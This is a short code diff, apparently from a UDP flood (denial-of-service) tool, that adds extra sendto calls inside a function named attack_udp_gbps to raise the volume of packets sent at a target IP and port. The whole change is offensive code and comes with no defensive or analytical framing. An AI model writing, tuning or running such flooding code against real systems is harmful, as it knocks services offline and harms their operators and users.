@@ -106,6 +106,9 @@ def attack_udp_gbps(ip, port, end_time, size):
                 s.sendto(data, (ip, dport))
                 s.sendto(data, (ip, dport))
                 s.sendto(data, (ip, dport))
+                s.sendto(data, (ip, dport))
+                s.sendto(data, (ip, dport))
+                s.sendto(data, (ip, dport))
         except Exception as e:
             print("Error:", e)
             continue
